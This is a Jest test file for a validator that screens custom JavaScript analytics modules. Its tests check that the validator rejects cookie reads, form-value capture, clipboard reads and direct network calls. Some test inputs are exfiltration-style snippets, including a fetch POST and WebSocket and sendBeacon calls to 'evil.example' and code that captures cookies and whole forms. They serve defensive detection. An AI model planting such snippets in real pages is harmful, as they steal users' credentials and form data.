'use strict';

const { analyze } = require('../../tools/validate-custom-pattern');

function wrap(body) {
  return `(window.XyliumBFModules = window.XyliumBFModules || []).push(function (core) {\n${body}\n});`;
}

function rulesFired(violations) {
  return violations.map((v) => v.rule);
}

describe('analyze() — structural checks', () => {
  test('rejects code not wrapped as a self-registering module', () => {
    const violations = analyze('function notAModule(core) { core.pushEvent({ type: "x" }); }');
    expect(rulesFired(violations)).toContain('structure');
  });

  test('rejects code that is not valid JavaScript', () => {
    const violations = analyze('this is not { valid js @@@');
    expect(rulesFired(violations)).toContain('syntax');
  });

  test('a syntax error short-circuits before any other rule runs', () => {
    const violations = analyze(wrap('const x = ;;;'));
    expect(violations.length).toBe(1);
    expect(violations[0].rule).toBe('syntax');
  });
});

describe('analyze() — the clean/accepted path', () => {
  test('a behavior-only module produces zero violations', () => {
    const src = wrap(`
      document.addEventListener('click', function (e) {
        core.pushEvent({ type: 'click', x: e.clientX, y: e.clientY, field: core.fieldIdFor(e.target) });
      }, { passive: true });
    `);
    expect(analyze(src)).toEqual([]);
  });
});

describe('analyze() — field-value-read', () => {
  test('flags e.target.value', () => {
    const src = wrap(`
      document.addEventListener('blur', function (e) {
        core.pushEvent({ type: 'x', v: e.target.value });
      }, true);
    `);
    expect(rulesFired(analyze(src))).toContain('field-value-read');
  });

  test('flags reading .value off a variable named "field"', () => {
    const src = wrap(`
      var field = document.getElementById('x');
      core.pushEvent({ type: 'x', v: field.value });
    `);
    expect(rulesFired(analyze(src))).toContain('field-value-read');
  });

  test('does not flag .value on an unrelated, non-field-shaped identifier', () => {
    const src = wrap(`
      var windowWidthSetting = { value: 42 };
      core.pushEvent({ type: 'x', v: windowWidthSetting.value });
    `);
    // "windowWidthSetting" doesn't match FIELD_LIKE_NAMES and isn't near "target"
    expect(rulesFired(analyze(src))).not.toContain('field-value-read');
  });
});

describe('analyze() — cookie-access', () => {
  test('flags reading document.cookie', () => {
    const src = wrap(`core.pushEvent({ type: 'x', c: document.cookie });`);
    expect(rulesFired(analyze(src))).toContain('cookie-access');
  });

  test('flags writing document.cookie', () => {
    const src = wrap(`document.cookie = 'a=b';`);
    expect(rulesFired(analyze(src))).toContain('cookie-access');
  });
});

describe('analyze() — content-read', () => {
  test.each(['innerText', 'textContent', 'innerHTML'])('flags reading %s', (prop) => {
    const src = wrap(`core.pushEvent({ type: 'x', c: document.body.${prop} });`);
    expect(rulesFired(analyze(src))).toContain('content-read');
  });
});

describe('analyze() — input-data-read', () => {
  test('flags InputEvent.data read off "e"', () => {
    const src = wrap(`
      document.addEventListener('input', function (e) {
        core.pushEvent({ type: 'x', d: e.data });
      });
    `);
    expect(rulesFired(analyze(src))).toContain('input-data-read');
  });
});

describe('analyze() — storage-access', () => {
  test('flags localStorage.getItem with a non-xylium key', () => {
    const src = wrap(`var v = localStorage.getItem('auth_token');`);
    expect(rulesFired(analyze(src))).toContain('storage-access');
  });

  test('flags sessionStorage.setItem with a non-xylium key', () => {
    const src = wrap(`sessionStorage.setItem('cart', '[]');`);
    expect(rulesFired(analyze(src))).toContain('storage-access');
  });

  test('does NOT flag a key in the SDK\'s own "xylium_" namespace', () => {
    const src = wrap(`var v = localStorage.getItem('xylium_did_tenant_test001');`);
    expect(rulesFired(analyze(src))).not.toContain('storage-access');
  });

  test('flags a dynamic (non-literal) storage key as unverifiable', () => {
    const src = wrap(`var k = 'auth_' + 'token'; var v = localStorage.getItem(k);`);
    expect(rulesFired(analyze(src))).toContain('storage-access');
  });
});

describe('analyze() — clipboard-content-read', () => {
  test('flags clipboardData.getData(...)', () => {
    const src = wrap(`
      document.addEventListener('paste', function (e) {
        core.pushEvent({ type: 'x', v: e.clipboardData.getData('text') });
      });
    `);
    expect(rulesFired(analyze(src))).toContain('clipboard-content-read');
  });
});

describe('analyze() — bypass-transport', () => {
  test('flags a direct fetch(...) call', () => {
    const src = wrap(`fetch('https://evil.example/exfil', { method: 'POST' });`);
    expect(rulesFired(analyze(src))).toContain('bypass-transport');
  });

  test('flags "new XMLHttpRequest()"', () => {
    const src = wrap(`var xhr = new XMLHttpRequest();`);
    expect(rulesFired(analyze(src))).toContain('bypass-transport');
  });

  test('flags "new WebSocket(...)"', () => {
    const src = wrap(`var ws = new WebSocket('wss://evil.example');`);
    expect(rulesFired(analyze(src))).toContain('bypass-transport');
  });

  test('flags navigator.sendBeacon(...)', () => {
    const src = wrap(`navigator.sendBeacon('https://evil.example', 'data');`);
    expect(rulesFired(analyze(src))).toContain('bypass-transport');
  });

  test('does NOT flag core.pushEvent / core.pushCriticalEvent (the sanctioned transport)', () => {
    const src = wrap(`
      core.pushEvent({ type: 'a' });
      core.pushCriticalEvent({ type: 'b' });
    `);
    expect(rulesFired(analyze(src))).not.toContain('bypass-transport');
  });
});

describe('analyze() — pii-regex', () => {
  test('flags an SSN-shaped regex literal', () => {
    const src = wrap(`var ssnRe = /\\d{3}-\\d{2}-\\d{4}/;`);
    expect(rulesFired(analyze(src))).toContain('pii-regex');
  });

  test('flags a card-number-shaped regex literal', () => {
    const src = wrap(`var cardRe = /\\d{4}-\\d{4}-\\d{4}-\\d{4}/;`);
    expect(rulesFired(analyze(src))).toContain('pii-regex');
  });

  test('flags an email-shaped regex literal', () => {
    const src = wrap(`var emailRe = /[a-z]+@[a-z]+\\.[a-z]+/;`);
    expect(rulesFired(analyze(src))).toContain('pii-regex');
  });

  test('does NOT flag an unrelated regex literal', () => {
    const src = wrap(`var digitsOnly = /^[0-9]+$/;`);
    expect(rulesFired(analyze(src))).not.toContain('pii-regex');
  });
});

describe('analyze() — realistic combined submissions', () => {
  test('a "helpful" field-snapshot submission is rejected with multiple violations', () => {
    const src = wrap(`
      document.addEventListener('blur', function (e) {
        if (!e.target || typeof e.target.value === 'undefined') return;
        core.pushEvent({
          type: 'field_snapshot',
          field: core.fieldIdFor(e.target),
          value: e.target.value,
          authCookie: document.cookie,
        });
      }, true);
    `);
    const violations = analyze(src);
    expect(violations.length).toBeGreaterThanOrEqual(2);
    expect(rulesFired(violations)).toEqual(
      expect.arrayContaining(['field-value-read', 'cookie-access'])
    );
  });

  test('a whole-form capture on submit is rejected for field-value-read', () => {
    const src = wrap(`
      document.addEventListener('submit', function (e) {
        var form = e.target;
        var captured = {};
        for (var i = 0; i < form.elements.length; i++) {
          var field = form.elements[i];
          if (!field.name) continue;
          captured[field.name] = field.value;
        }
        core.pushEvent({ type: 'form_data_snapshot', fields: captured });
      }, true);
    `);
    expect(rulesFired(analyze(src))).toContain('field-value-read');
  });

  test('a rage-click style behavior-only pattern stays clean', () => {
    const src = wrap(`
      var clickTimes = [];
      document.addEventListener('click', function (e) {
        var now = performance.now();
        clickTimes.push(now);
        clickTimes = clickTimes.filter(function (t) { return now - t <= 1200; });
        if (clickTimes.length >= 3) {
          core.pushEvent({ type: 'rage_click', field: core.fieldIdFor(e.target), clickCount: clickTimes.length });
          clickTimes = [];
        }
      }, { passive: true });
    `);
    expect(analyze(src)).toEqual([]);
  });
});
